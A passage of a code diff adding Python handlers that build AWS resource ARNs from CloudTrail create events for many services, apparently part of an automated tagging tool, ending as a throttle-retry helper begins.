+                      return f"arn:aws:cloudhsm:{region}:{account_id}:cluster/{cluster_id}"
+
+              # CloudHSM v2 HSM — tagging routes to parent cluster (idempotent with CreateCluster handler)
+              elif event_name == 'CreateHsm' and event_source == 'cloudhsm.amazonaws.com':
+                  cluster_id = (resp.get('hsm') or {}).get('clusterId') or req.get('clusterId')
+                  if cluster_id:
+                      return f"arn:aws:cloudhsm:{region}:{account_id}:cluster/{cluster_id}"
+
+              # AWS Directory Service (Simple AD + Managed Microsoft AD + AD Connector)
+              elif event_name in ('CreateDirectory', 'CreateMicrosoftAD', 'ConnectDirectory') and event_source == 'ds.amazonaws.com':
+                  dir_id = resp.get('directoryId')
+                  if dir_id:
+                      return f"arn:aws:ds:{region}:{account_id}:directory/{dir_id}"
+
+              # Amazon Keyspaces — responseElements is empty on CreateKeyspace;
+              # name is in requestParameters.keyspaceName. Trailing slash required
+              # per keyspaces ARN format.
+              elif event_name == 'CreateKeyspace' and event_source == 'cassandra.amazonaws.com':
+                  ks_name = req.get('keyspaceName')
+                  if ks_name:
+                      return f"arn:aws:cassandra:{region}:{account_id}:/keyspace/{ks_name}/"
+
+              # SageMaker
+              elif event_name == 'CreateNotebookInstance':
+                  return resp.get('notebookInstanceArn')
+
+              # Comprehend
+              elif event_name == 'CreateDocumentClassifier':
+                  return resp.get('documentClassifierArn')
+
+              # AppSync
+              elif event_name == 'CreateGraphqlApi' and event_source == 'appsync.amazonaws.com':
+                  api = resp.get('graphqlApi', {})
+                  return api.get('arn')
+
+              # IoT
+              elif event_name == 'CreateThing':
+                  return resp.get('thingArn')
+
+              # Service Catalog
+              elif event_name == 'CreatePortfolio':
+                  portfolio = resp.get('portfolioDetail', {})
+                  return portfolio.get('aRN')  # Note: capital ARN
+
+              # Transfer Family Server
+              elif event_name == 'CreateServer' and event_source == 'transfer.amazonaws.com':
+                  server_id = resp.get('serverId')
+                  if server_id:
+                      return f"arn:aws:transfer:{region}:{account_id}:server/{server_id}"
+
+              # RDS Proxy
+              elif event_name == 'CreateDBProxy':
+                  proxy = resp.get('dBProxy', {})
+                  return proxy.get('dBProxyArn')
+
+              # Global Accelerator
+              elif event_name == 'CreateAccelerator':
+                  accelerator = resp.get('accelerator', {})
+                  return accelerator.get('acceleratorArn')
+
+              # CodeBuild Project
+              elif event_name == 'CreateProject' and event_source == 'codebuild.amazonaws.com':
+                  project = resp.get('project', {})
+                  return project.get('arn')
+
+              # CodePipeline Pipeline - ARN not in response, construct from name
+              elif event_name == 'CreatePipeline' and event_source == 'codepipeline.amazonaws.com':
+                  pipeline = resp.get('pipeline', {})
+                  pipeline_name = pipeline.get('name')
+                  if pipeline_name:
+                      return f"arn:aws:codepipeline:{region}:{account_id}:{pipeline_name}"
+
+              # Target Group
+              elif event_name == 'CreateTargetGroup':
+                  tgs = resp.get('targetGroups', [])
+                  if tgs and len(tgs) > 0:
+                      return tgs[0].get('targetGroupArn')
+
+              # Glue Database
+              elif event_name == 'CreateDatabase' and event_source == 'glue.amazonaws.com':
+                  db_name = req.get('databaseInput', {}).get('name')
+                  if db_name:
+                      return f"arn:aws:glue:{region}:{account_id}:database/{db_name}"
+
+              # Glue Crawler
+              elif event_name == 'CreateCrawler':
+                  crawler_name = req.get('name')
+                  if crawler_name:
+                      return f"arn:aws:glue:{region}:{account_id}:crawler/{crawler_name}"
+
+              # Glue Workflow
+              elif event_name == 'CreateWorkflow':
+                  workflow_name = resp.get('name')
+                  if workflow_name:
+                      return f"arn:aws:glue:{region}:{account_id}:workflow/{workflow_name}"
+
+              # Backup Plan
+              elif event_name == 'CreateBackupPlan':
+                  plan_id = resp.get('backupPlanId')
+                  if plan_id:
+                      return f"arn:aws:backup:{region}:{account_id}:backup-plan:{plan_id}"
+
+              # CloudWatch Dashboard — RGTA rejects both regionless and regional
+              # ARNs. Include region so native cloudwatch:tag_resource dispatch works.
+              elif event_name == 'PutDashboard':
+                  dashboard_name = ci_get(req, 'dashboardName')
+                  if dashboard_name:
+                      return f"arn:aws:cloudwatch:{region}:{account_id}:dashboard/{dashboard_name}"
+
+              # EMR Cluster (RunJobFlow)
+              elif event_name == 'RunJobFlow':
+                  cluster_id = resp.get('jobFlowId')
+                  if cluster_id:
+                      return f"arn:aws:elasticmapreduce:{region}:{account_id}:cluster/{cluster_id}"
+
+              # EKS Cluster
+              elif event_name == 'CreateCluster' and event_source == 'eks.amazonaws.com':
+                  cluster = resp.get('cluster', {})
+                  cluster_arn = cluster.get('arn')
+                  if cluster_arn:
+                      return cluster_arn
+
+              # EKS Nodegroup
+              elif event_name == 'CreateNodegroup':
+                  nodegroup = resp.get('nodegroup', {})
+                  return nodegroup.get('nodegroupArn')
+
+              # ElastiCache - needs retry, but add ARN extraction
+              elif event_name == 'CreateCacheCluster':
+                  cache = resp.get('cacheCluster', {})
+                  return cache.get('aRN')
+
+              # Route53 Hosted Zone
+              elif event_name == 'CreateHostedZone':
+                  zone_id = resp.get('hostedZone', {}).get('id')
+                  if zone_id:
+                      # ID format: /hostedzone/Z0862949349EG6JSOWHXK
+                      zone_id = zone_id.split('/')[-1]
+                      return f"arn:aws:route53:::hostedzone/{zone_id}"
+
+              # VPC Peering Connection
+              elif event_name == 'CreateVpcPeeringConnection':
+                  vpc_pcx = resp.get('vpcPeeringConnection', {})
+                  if not vpc_pcx and 'CreateVpcPeeringConnectionResponse' in resp:
+                      vpc_pcx = resp['CreateVpcPeeringConnectionResponse'].get('vpcPeeringConnection', {})
+                  pcx_id = vpc_pcx.get('vpcPeeringConnectionId')
+                  if pcx_id:
+                      return f"arn:aws:ec2:{region}:{account_id}:vpc-peering-connection/{pcx_id}"
+
+              # EBS Snapshot — scope to EC2 source to prevent catching CreateSnapshot
+              # from ElastiCache / MemoryDB / FSx (OpenZFS) / Redshift Serverless,
+              # which use the same event name but different response shapes.
+              # Non-EC2 CreateSnapshot is handled by the universal scan above
+              # (ElastiCache/MemoryDB via 'snapshot.ARN' key) or by explicit
+              # handlers further down (FSx, Redshift Serverless).
+              elif event_name == 'CreateSnapshot' and event_source == 'ec2.amazonaws.com':
+                  snapshot_id = resp.get('snapshotId')
+                  if snapshot_id:
+                      return f"arn:aws:ec2:{region}:{account_id}:snapshot/{snapshot_id}"
+
+              # VPC Flow Logs
+              elif event_name == 'CreateFlowLogs':
+                  # EC2 response wrapper: CreateFlowLogsResponse.flowLogIdSet.item
+                  fl_id = None
+                  if 'CreateFlowLogsResponse' in resp:
+                      nested = resp['CreateFlowLogsResponse']
+                      fl_id_set = nested.get('flowLogIdSet', {})
+                      fl_id = fl_id_set.get('item') if isinstance(fl_id_set, dict) else None
+                      if isinstance(fl_id, list):
+                          fl_id = fl_id[0]
+                  if not fl_id:
+                      flow_ids = resp.get('flowLogIds', [])
+                      fl_id = flow_ids[0] if flow_ids else None
+                  if fl_id:
+                      return f"arn:aws:ec2:{region}:{account_id}:vpc-flow-log/{fl_id}"
+
+              # SSM Document
+              elif event_name == 'CreateDocument':
+                  doc_desc = resp.get('documentDescription', {})
+                  doc_name = doc_desc.get('name')
+                  if doc_name:
+                      return f"arn:aws:ssm:{region}:{account_id}:document/{doc_name}"
+
+              # DHCP Options
+              elif event_name == 'CreateDhcpOptions':
+                  dhcp = resp.get('dhcpOptions', {})
+                  if not dhcp and 'CreateDhcpOptionsResponse' in resp:
+                      dhcp = resp['CreateDhcpOptionsResponse'].get('dhcpOptions', {})
+                  dhcp_id = dhcp.get('dhcpOptionsId')
+                  if dhcp_id:
+                      return f"arn:aws:ec2:{region}:{account_id}:dhcp-options/{dhcp_id}"
+
+              # AMI (CreateImage)
+              elif event_name == 'CreateImage':
+                  image_id = resp.get('imageId')
+                  if not image_id:
+                      image_id = resp.get('ImageId')
+                  if image_id:
+                      return f"arn:aws:ec2:{region}:{account_id}:image/{image_id}"
+
+              # DMS Replication Instance
+              elif event_name == 'CreateReplicationInstance':
+                  rep = resp.get('replicationInstance', {})
+                  rep_arn = rep.get('replicationInstanceArn')
+                  if rep_arn:
+                      return rep_arn
+
+              # DataSync Task
+              elif event_name == 'CreateTask':
+                  task_arn = resp.get('taskArn')
+                  if task_arn:
+                      return task_arn
+
+              # Glue DataBrew Dataset
+              elif event_name == 'CreateDataset' and event_source == 'databrew.amazonaws.com':
+                  name = resp.get('Name') or req.get('Name')
+                  if name:
+                      return f"arn:aws:databrew:{region}:{account_id}:dataset/{name}"
+
+              # Glue DataBrew Recipe
+              elif event_name == 'CreateRecipe' and event_source == 'databrew.amazonaws.com':
+                  name = resp.get('Name') or req.get('Name')
+                  if name:
+                      return f"arn:aws:databrew:{region}:{account_id}:recipe/{name}"
+
+              # Amazon Timestream Database
+              elif event_name == 'CreateDatabase' and event_source == 'timestream.amazonaws.com':
+                  db = resp.get('Database', {})
+                  db_arn = db.get('Arn')
+                  if db_arn:
+                      return db_arn
+
+              # Amazon Timestream Table
+              elif event_name == 'CreateTable' and event_source == 'timestream.amazonaws.com':
+                  tbl = resp.get('Table', {})
+                  tbl_arn = tbl.get('Arn')
+                  if tbl_arn:
+                      return tbl_arn
+
+              # EMR Serverless Application (applicationId not ARN in response)
+              elif event_name == 'CreateApplication' and event_source == 'emr-serverless.amazonaws.com':
+                  app_id = resp.get('applicationId')
+                  if app_id:
+                      return f"arn:aws:emr-serverless:{region}:{account_id}:/applications/{app_id}"
+
+              # Amazon Kendra Index (Id not ARN in response)
+              elif event_name == 'CreateIndex' and event_source == 'kendra.amazonaws.com':
+                  # §1.97 — CloudTrail emits lowercase 'id', boto3 SDK shape is
+                  # 'Id'. Prior handler used resp.get('Id') → silent miss on every
+                  # Kendra Index creation. ci_get catches either casing.
+                  idx_id = ci_get(resp, 'Id')
+                  if idx_id:
+                      return f"arn:aws:kendra:{region}:{account_id}:index/{idx_id}"
+
+              # Amazon Kendra DataSource
+              elif event_name == 'CreateDataSource' and event_source == 'kendra.amazonaws.com':
+                  ds_id = ci_get(resp, 'Id')
+                  idx_id = ci_get(req, 'IndexId')
+                  if ds_id and idx_id:
+                      return f"arn:aws:kendra:{region}:{account_id}:index/{idx_id}/data-source/{ds_id}"
+
+              # AWS Elastic Beanstalk Application
+              elif event_name == 'CreateApplication' and event_source == 'elasticbeanstalk.amazonaws.com':
+                  # §1.103 — CloudTrail nests at 'application.applicationName'
+                  # (lowercase leading) while boto3 SDK shape is
+                  # 'Application.ApplicationName'. ci_get the outer object and
+                  # the inner key so either casing works.
+                  app = ci_get(resp, 'Application') or {}
+                  app_arn = ci_get(app, 'ApplicationArn')
+                  if app_arn:
+                      return app_arn
+                  app_name = ci_get(app, 'ApplicationName') or ci_get(req, 'ApplicationName')
+                  if app_name:
+                      return f"arn:aws:elasticbeanstalk:{region}:{account_id}:application/{app_name}"
+
+              # AWS Elastic Beanstalk Environment
+              elif event_name == 'CreateEnvironment' and event_source == 'elasticbeanstalk.amazonaws.com':
+                  # Same casing-variance class as CreateApplication above.
+                  env_arn = ci_get(resp, 'EnvironmentArn')
+                  if env_arn:
+                      return env_arn
+
+              # Amazon GameLift Build
+              elif event_name == 'CreateBuild' and event_source == 'gamelift.amazonaws.com':
+                  build = resp.get('Build', {})
+                  build_arn = build.get('BuildArn') or build.get('buildArn')
+                  if build_arn:
+                      return build_arn
+
+              # Amazon GameLift Script
+              elif event_name == 'CreateScript' and event_source == 'gamelift.amazonaws.com':
+                  script = resp.get('Script', {})
+                  script_arn = script.get('ScriptArn') or script.get('scriptArn')
+                  if script_arn:
+                      return script_arn
+
+              # Amazon GameLift Fleet
+              elif event_name == 'CreateFleet' and event_source == 'gamelift.amazonaws.com':
+                  fleet_attrib = resp.get('FleetAttributes', {})
+                  fleet_arn = fleet_attrib.get('FleetArn')
+                  if fleet_arn:
+                      return fleet_arn
+
+              # RDS Snapshots (flat response — ARN is at top level)
+              elif event_name == 'CreateDBSnapshot':
+                  arn = resp.get('dBSnapshotArn')
+                  if not arn:
+                      arn = resp.get('dBSnapshot', {}).get('dBSnapshotArn')
+                  if arn:
+                      return arn
+
+              elif event_name == 'CreateDBClusterSnapshot':
+                  arn = resp.get('dBClusterSnapshotArn')
+                  if not arn:
+                      arn = resp.get('dBClusterSnapshot', {}).get('dBClusterSnapshotArn')
+                  if arn:
+                      return arn
+
+              elif event_name == 'CreateDBInstanceReadReplica':
+                  arn = resp.get('dBInstanceArn')
+                  if not arn:
+                      arn = resp.get('dBInstance', {}).get('dBInstanceArn')
+                  if arn:
+                      return arn
+
+              # Bedrock Application Inference Profile
+              elif event_name == 'CreateInferenceProfile':
+                  inf_arn = resp.get('inferenceProfileArn')
+                  if inf_arn:
+                      return inf_arn
+
+              # Kinesis Analytics v2 (KDA)
+              elif event_name == 'CreateApplication' and event_source == 'kinesisanalytics.amazonaws.com':
+                  app_arn = resp.get('applicationDetail', {}).get('applicationARN')
+                  if not app_arn:
+                      app_arn = resp.get('ApplicationARN')
+                  if app_arn:
+                      return app_arn
+
+              # Redshift Serverless Namespace
+              elif event_name == 'CreateNamespace':
+                  ns = resp.get('namespace', {})
+                  ns_arn = ns.get('namespaceArn')
+                  if ns_arn:
+                      return ns_arn
+
+              # Redshift Serverless Workgroup (empty responseElements — construct from request)
+              elif event_name == 'CreateWorkgroup':
+                  wg = resp.get('workgroup', {})
+                  wg_arn = wg.get('workgroupArn')
+                  if not wg_arn:
+                      wg_name = req.get('workgroupName')
+                      if wg_name:
+                          wg_arn = f"arn:aws:redshift-serverless:{region}:{account_id}:workgroup/{wg_name}"
+                  if wg_arn:
+                      return wg_arn
+
+              # Carrier Gateway
+              elif event_name == 'CreateCarrierGateway':
+                  cagw = resp.get('carrierGateway', {})
+                  if not cagw and 'CreateCarrierGatewayResponse' in resp:
+                      cagw = resp['CreateCarrierGatewayResponse'].get('carrierGateway', {})
+                  cagw_id = cagw.get('carrierGatewayId')
+                  if cagw_id:
+                      return f"arn:aws:ec2:{region}:{account_id}:carrier-gateway/{cagw_id}"
+
+              # Glue Trigger
+              elif event_name == 'CreateTrigger' and event_source == 'glue.amazonaws.com':
+                  trigger_name = resp.get('name')
+                  if trigger_name:
+                      return f"arn:aws:glue:{region}:{account_id}:trigger/{trigger_name}"
+
+              # VPC Endpoint
+              elif event_name == 'CreateVpcEndpoint':
+                  vpc_endpoint = resp.get('vpcEndpoint', {})
+                  if not vpc_endpoint and 'CreateVpcEndpointResponse' in resp:
+                      vpc_endpoint = resp['CreateVpcEndpointResponse'].get('vpcEndpoint', {})
+                  vpc_endpoint_id = vpc_endpoint.get('vpcEndpointId')
+                  if vpc_endpoint_id:
+                      return f"arn:aws:ec2:{region}:{account_id}:vpc-endpoint/{vpc_endpoint_id}"
+
+              # API Gateway v2 VPC Link
+              elif event_name == 'CreateVpcLink' and event_source == 'apigateway.amazonaws.com':
+                  vpc_link_id = resp.get('vpcLinkId')
+                  if vpc_link_id:
+                      return f"arn:aws:apigateway:{region}::/vpclinks/{vpc_link_id}"
+
+              # App Mesh (3-level deep: mesh.metadata.arn)
+              elif event_name == 'CreateMesh':
+                  mesh_arn = resp.get('mesh', {}).get('metadata', {}).get('arn')
+                  if mesh_arn:
+                      return mesh_arn
+
+              # API Gateway API Key — handler removed 2026-04-26 (plan-PR #56 D11).
+              # CreateApiKey is now in IGNORE_EVENTS; its ARN shape is rejected
+              # by all tagging APIs (RGTA + native) per
+              # docs/MAP_TAGGING_GAP_ANALYSIS.md.
+
+              # CloudWatch Insights Query Definition
+              # CloudWatch Logs Insights QueryDefinition — §1.86. Not taggable
+              # per AWS (the 'arn:aws:logs:<region>:<acct>:query-definition:<id>'
+              # shape is rejected by RGTA). Moved to IGNORE_EVENTS; dead
+              # handler removed.
+
+              # Athena WorkGroup
+              elif event_name == 'CreateWorkGroup':
+                  workgroup_name = req.get('name')
+                  if workgroup_name:
+                      return f"arn:aws:athena:{region}:{account_id}:workgroup/{workgroup_name}"
+
+              # Service Discovery HTTP Namespace — §1.87. AWS returns an
+              # operationId, not the namespace ID. Constructing the ARN would
+              # require an async DescribeOperation poll (possibly minutes) that
+              # doesn't fit the 180s SQS visibility window. Moved to
+              # IGNORE_EVENTS rather than leaving a dead handler that generates
+              # no_arn skips (and potential SNS noise if any follow-up promotes
+              # no_arn to a permanent failure class).
+
+              # AWS Security Hub — §1.84. EnableSecurityHub returns a null body,
+              # so the universal ARN scan has nothing to extract. The hub is
+              # always named 'default' (the only supported case per AWS docs);
+              # construct the ARN directly.
+              elif event_name == 'EnableSecurityHub' and event_source == 'securityhub.amazonaws.com':
+                  return f"arn:aws:securityhub:{region}:{account_id}:hub/default"
+
+              # AWS Storage Gateway — §1.85. ActivateGateway returns the ARN on
+              # 'GatewayARN' (uppercase per the Storage Gateway API shape), which
+              # the allowlist didn't include prior to PR #43a's suffix-match.
+              # The suffix-match catches it, but Storage Gateway also requires
+              # native 'storagegateway:AddTagsToResource' dispatch (RGTA doesn't
+              # cover it) — enforced in tag_resource below.
+              elif event_name == 'ActivateGateway' and event_source == 'storagegateway.amazonaws.com':
+                  gw_arn = ci_get(resp, 'GatewayARN') or ci_get(resp, 'gatewayArn')
+                  if gw_arn:
+                      return gw_arn
+
+              # (CreateLoadBalancer handled above at the ELBv2 branch — both
+              # ELBv1 Classic and ELBv2 share eventSource.)
+
+              # ACM Private CA
+              elif event_name == 'CreateCertificateAuthority':
+                  ca_arn = resp.get('certificateAuthorityArn')
+                  if ca_arn:
+                      return ca_arn
+
+              # RAM Resource Share
+              elif event_name == 'CreateResourceShare':
+                  share = resp.get('resourceShare', {})
+                  share_arn = share.get('resourceShareArn')
+                  if share_arn:
+                      return share_arn
+
+              # Storage Gateway Tape Pool
+              elif event_name == 'CreateTapePool':
+                  pool_arn = resp.get('poolARN')
+                  if pool_arn:
+                      return pool_arn
+
+              # Cognito User Pool
+              elif event_name == 'CreateUserPool' and event_source == 'cognito-idp.amazonaws.com':
+                  pool = resp.get('userPool', {})
+                  pool_id = pool.get('id')
+                  if pool_id:
+                      return f"arn:aws:cognito-idp:{region}:{account_id}:userpool/{pool_id}"
+
+              # Cognito Identity Pool
+              elif event_name == 'CreateIdentityPool':
+                  pool_id = resp.get('identityPoolId')
+                  if pool_id:
+                      return f"arn:aws:cognito-identity:{region}:{account_id}:identitypool/{pool_id}"
+
+              # Network Firewall Policy
+              elif event_name == 'CreateFirewallPolicy':
+                  nfw_resp = resp.get('firewallPolicyResponse', {})
+                  nfw_arn = nfw_resp.get('firewallPolicyArn')
+                  if nfw_arn:
+                      return nfw_arn
+
+              # Network Firewall
+              elif event_name == 'CreateFirewall':
+                  fw = resp.get('firewall', {})
+                  fw_arn = fw.get('firewallArn')
+                  if fw_arn:
+                      return fw_arn
+
+              # AWS WAFv2 WebACL
+              # responseElements.summary.aRN — works for both REGIONAL and CLOUDFRONT scope.
+              # (CLOUDFRONT-scope WebACLs only exist in us-east-1; ARN reflects scope via
+              #  global/ vs regional/ path prefix.)
+              elif event_name == 'CreateWebACL' and event_source == 'wafv2.amazonaws.com':
+                  summary = resp.get('summary', {})
+                  webacl_arn = summary.get('aRN') or summary.get('ARN') or summary.get('arn')
+                  if webacl_arn:
+                      return webacl_arn
+
+              # AWS WAFv2 IPSet
+              elif event_name == 'CreateIPSet' and event_source == 'wafv2.amazonaws.com':
+                  summary = resp.get('summary', {})
+                  ipset_arn = summary.get('aRN') or summary.get('ARN') or summary.get('arn')
+                  if ipset_arn:
+                      return ipset_arn
+
+              # AWS CodeDeploy Application — response has only applicationId; build ARN.
+              elif event_name == 'CreateApplication' and event_source == 'codedeploy.amazonaws.com':
+                  app_name = req.get('applicationName')
+                  if app_name:
+                      return f"arn:aws:codedeploy:{region}:{account_id}:application:{app_name}"
+
+              # AWS CodeDeploy DeploymentGroup — response has only deploymentGroupId; build ARN.
+              elif event_name == 'CreateDeploymentGroup' and event_source == 'codedeploy.amazonaws.com':
+                  app_name = req.get('applicationName')
+                  dg_name = req.get('deploymentGroupName')
+                  if app_name and dg_name:
+                      return f"arn:aws:codedeploy:{region}:{account_id}:deploymentgroup:{app_name}/{dg_name}"
+
+              # EKS Add-on
+              elif event_name == 'CreateAddon':
+                  addon = resp.get('addon', {})
+                  addon_arn = addon.get('addonArn')
+                  if addon_arn:
+                      return addon_arn
+
+              # (Lambda Layers and Aliases are not taggable — PublishLayerVersion is
+              # in IGNORE_EVENTS. Aliases were already unhandled here.)
+
+              # Transit Gateway VPC Attachment
+              elif event_name == 'CreateTransitGatewayVpcAttachment':
+                  tgwa = resp.get('transitGatewayVpcAttachment', {})
+                  if not tgwa and 'CreateTransitGatewayVpcAttachmentResponse' in resp:
+                      tgwa = resp['CreateTransitGatewayVpcAttachmentResponse'].get('transitGatewayVpcAttachment', {})
+                  att_id = tgwa.get('transitGatewayAttachmentId')
+                  if att_id:
+                      return f"arn:aws:ec2:{region}:{account_id}:transit-gateway-attachment/{att_id}"
+
+              # ElastiCache Snapshot
+              elif event_name == 'CreateSnapshot' and event_source == 'elasticache.amazonaws.com':
+                  snap = resp.get('snapshot', {})
+                  snap_arn = snap.get('aRN') or snap.get('arn') or snap.get('ARN')
+                  if not snap_arn:
+                      snap_name = snap.get('snapshotName') or req.get('snapshotName')
+                      if snap_name:
+                          snap_arn = f"arn:aws:elasticache:{region}:{account_id}:snapshot:{snap_name}"
+                  if snap_arn:
+                      return snap_arn
+
+              # WorkSpaces
+              elif event_name == 'CreateWorkspaces':
+                  pending = resp.get('pendingRequests', [])
+                  if pending:
+                      ws_id = pending[0].get('workspaceId')
+                      if ws_id:
+                          return f"arn:aws:workspaces:{region}:{account_id}:workspace/{ws_id}"
+
+              # Route53 Health Check
+              elif event_name == 'CreateHealthCheck':
+                  health_check = resp.get('healthCheck', {})
+                  health_check_id = health_check.get('id')
+                  if health_check_id:
+                      return f"arn:aws:route53:::healthcheck/{health_check_id}"
+
+              # EC2 Key Pair
+              elif event_name == 'CreateKeyPair':
+                  key_pair_id = resp.get('keyPairId')
+                  if key_pair_id:
+                      return f"arn:aws:ec2:{region}:{account_id}:key-pair/{key_pair_id}"
+
+              # DAX Cluster
+              elif event_name == 'CreateCluster' and event_source == 'dax.amazonaws.com':
+                  cluster = resp.get('cluster', {})
+                  cluster_arn = cluster.get('clusterArn')
+                  if cluster_arn:
+                      return cluster_arn
+
+              # DynamoDB RestoreTableFromBackup / RestoreTableToPointInTime
+              elif event_name in ('RestoreTableFromBackup', 'RestoreTableToPointInTime') and event_source == 'dynamodb.amazonaws.com':
+                  desc = resp.get('tableDescription', {})
+                  table_arn = desc.get('tableArn')
+                  if table_arn:
+                      return table_arn
+
+              # ElastiCache Serverless
+              elif event_name == 'CreateServerlessCache' and event_source == 'elasticache.amazonaws.com':
+                  sc = resp.get('serverlessCache', {})
+                  sc_arn = sc.get('aRN') or sc.get('arn') or sc.get('ARN')
+                  if sc_arn:
+                      return sc_arn
+
+              # MSK CreateClusterV2 (MSK Serverless / Provisioned v2)
+              elif event_name == 'CreateClusterV2' and event_source == 'kafka.amazonaws.com':
+                  cluster_arn = resp.get('clusterArn')
+                  if cluster_arn:
+                      return cluster_arn
+
+              # Amazon OpenSearch Service (managed — NOT Serverless)
+              elif event_name == 'CreateDomain' and event_source == 'es.amazonaws.com':
+                  domain_status = resp.get('domainStatus', {})
+                  domain_arn = domain_status.get('ARN') or domain_status.get('arn')
+                  if domain_arn:
+                      return domain_arn
+
+              # SageMaker Domain (Studio) — case-insensitive per §1.91 class
+              elif event_name == 'CreateDomain' and event_source == 'sagemaker.amazonaws.com':
+                  domain_arn = ci_get(resp, 'domainArn')
+                  if domain_arn:
+                      return domain_arn
+
+              # SageMaker Pipeline
+              elif event_name == 'CreatePipeline' and event_source == 'sagemaker.amazonaws.com':
+                  pipeline_arn = ci_get(resp, 'pipelineArn')
+                  if pipeline_arn:
+                      return pipeline_arn
+
+              # SageMaker Feature Group
+              elif event_name == 'CreateFeatureGroup' and event_source == 'sagemaker.amazonaws.com':
+                  fg_arn = ci_get(resp, 'featureGroupArn')
+                  if fg_arn:
+                      return fg_arn
+
+              # FSx Backup
+              elif event_name == 'CreateBackup' and event_source == 'fsx.amazonaws.com':
+                  backup = resp.get('backup', {})
+                  backup_arn = backup.get('resourceARN')
+                  if backup_arn:
+                      return backup_arn
+
+              # FSx CreateFileSystemFromBackup
+              elif event_name == 'CreateFileSystemFromBackup' and event_source == 'fsx.amazonaws.com':
+                  fs = resp.get('fileSystem', {})
+                  fs_arn = fs.get('resourceARN')
+                  if fs_arn:
+                      return fs_arn
+
+              # FSx OpenZFS Snapshot — response.snapshot.ResourceARN (capital R in ARN)
+              elif event_name == 'CreateSnapshot' and event_source == 'fsx.amazonaws.com':
+                  snapshot = resp.get('snapshot', {})
+                  snap_arn = snapshot.get('ResourceARN') or snapshot.get('resourceARN')
+                  if snap_arn:
+                      return snap_arn
+
+              # Redshift Serverless Snapshot
+              elif event_name == 'CreateSnapshot' and event_source == 'redshift-serverless.amazonaws.com':
+                  snapshot = resp.get('snapshot', {})
+                  snap_arn = snapshot.get('snapshotArn')
+                  if snap_arn:
+                      return snap_arn
+
+              # DMS Serverless (CreateReplicationConfig)
+              elif event_name == 'CreateReplicationConfig' and event_source == 'dms.amazonaws.com':
+                  rc = resp.get('replicationConfig', {})
+                  rc_arn = rc.get('replicationConfigArn')
+                  if rc_arn:
+                      return rc_arn
+
+              # Neptune (uses same event names as RDS but different source)
+              elif event_name in ('CreateDBCluster', 'CreateDBInstance') and event_source == 'rds.amazonaws.com':
+                  # Already handled by existing RDS handlers — this catches Neptune/DocDB
+                  # which share the rds.amazonaws.com event source
+                  pass
+
+              # Transfer Family Connector
+              elif event_name == 'CreateConnector' and event_source == 'transfer.amazonaws.com':
+                  connector_id = resp.get('connectorId')
+                  if connector_id:
+                      return f"arn:aws:transfer:{region}:{account_id}:connector/{connector_id}"
+
+              # Transfer Family User
+              elif event_name == 'CreateUser' and event_source == 'transfer.amazonaws.com':
+                  server_id = req.get('serverId')
+                  user_name = resp.get('userName') or req.get('userName')
+                  if server_id and user_name:
+                      return f"arn:aws:transfer:{region}:{account_id}:user/{server_id}/{user_name}"
+
+              # Direct Connect LAG
+              elif event_name == 'CreateLag' and event_source == 'directconnect.amazonaws.com':
+                  lag_id = resp.get('lagId')
+                  if lag_id:
+                      return f"arn:aws:directconnect:{region}:{account_id}:dxlag/{lag_id}"
+
+              # Direct Connect Gateway
+              elif event_name == 'CreateDirectConnectGateway' and event_source == 'directconnect.amazonaws.com':
+                  gw = resp.get('directConnectGateway', {})
+                  gw_id = gw.get('directConnectGatewayId')
+                  if gw_id:
+                      return f"arn:aws:directconnect::{account_id}:dx-gateway/{gw_id}"
+
+              # Kinesis Video Streams (disambiguate from Kinesis Data Streams)
+              elif event_name == 'CreateStream' and event_source == 'kinesisvideo.amazonaws.com':
+                  stream_arn = resp.get('streamARN') or resp.get('streamArn')
+                  if stream_arn:
+                      return stream_arn
+
+              # Elastic Disaster Recovery (DRS) Source Server
+              elif event_name == 'CreateSourceServer' and event_source == 'drs.amazonaws.com':
+                  source_arn = resp.get('arn') or resp.get('sourceServerArn')
+                  if source_arn:
+                      return source_arn
+
+              # Deadline Cloud Farm
+              elif event_name == 'CreateFarm' and event_source == 'deadline.amazonaws.com':
+                  farm_id = resp.get('farmId')
+                  if farm_id:
+                      return f"arn:aws:deadline:{region}:{account_id}:farm/{farm_id}"
+
+              # Deadline Cloud Queue
+              elif event_name == 'CreateQueue' and event_source == 'deadline.amazonaws.com':
+                  farm_id = req.get('farmId')
+                  queue_id = resp.get('queueId')
+                  if farm_id and queue_id:
+                      return f"arn:aws:deadline:{region}:{account_id}:farm/{farm_id}/queue/{queue_id}"
+
+              # Deadline Cloud Fleet
+              elif event_name == 'CreateFleet' and event_source == 'deadline.amazonaws.com':
+                  farm_id = req.get('farmId')
+                  fleet_id = resp.get('fleetId')
+                  if farm_id and fleet_id:
+                      return f"arn:aws:deadline:{region}:{account_id}:farm/{farm_id}/fleet/{fleet_id}"
+
+              # IoT Core Topic Rule
+              elif event_name == 'CreateTopicRule' and event_source == 'iot.amazonaws.com':
+                  rule_name = req.get('ruleName')
+                  if rule_name:
+                      return f"arn:aws:iot:{region}:{account_id}:rule/{rule_name}"
+
+              # IoT SiteWise Asset
+              elif event_name == 'CreateAsset' and event_source == 'iotsitewise.amazonaws.com':
+                  asset_id = resp.get('assetId')
+                  if asset_id:
+                      return f"arn:aws:iotsitewise:{region}:{account_id}:asset/{asset_id}"
+
+              # IoT SiteWise Asset Model
+              elif event_name == 'CreateAssetModel' and event_source == 'iotsitewise.amazonaws.com':
+                  model_id = resp.get('assetModelId')
+                  if model_id:
+                      return f"arn:aws:iotsitewise:{region}:{account_id}:asset-model/{model_id}"
+
+              # IoT SiteWise Gateway
+              elif event_name == 'CreateGateway' and event_source == 'iotsitewise.amazonaws.com':
+                  gw_id = resp.get('gatewayId')
+                  if gw_id:
+                      return f"arn:aws:iotsitewise:{region}:{account_id}:gateway/{gw_id}"
+
+              # IoT SiteWise Portal
+              elif event_name == 'CreatePortal' and event_source == 'iotsitewise.amazonaws.com':
+                  portal_id = resp.get('portalId')
+                  if portal_id:
+                      return f"arn:aws:iotsitewise:{region}:{account_id}:portal/{portal_id}"
+
+              return None
+
+          # Shared throttle-code set used by both native dispatch branches and
+          # the RGTA fallthrough. RGTA throws 'ThrottledException' (with "ed")
+          # — most other AWS services throw 'ThrottlingException' (with "ing").
+          # Both variants must be enumerated, alongside the generic rate-limit
+          # codes. Hoisted to module scope so _retry_throttles() and the RGTA
+          # retry loop below share the same constant (21.0.6, §1.81/§1.92).
+          THROTTLE_CODES = {'ThrottlingException', 'ThrottledException', 'RequestLimitExceeded', 'TooManyRequestsException'}
+
+          def _retry_throttles(fn):
+              """Call fn() with exponential-backoff retry on throttle ClientError.
+
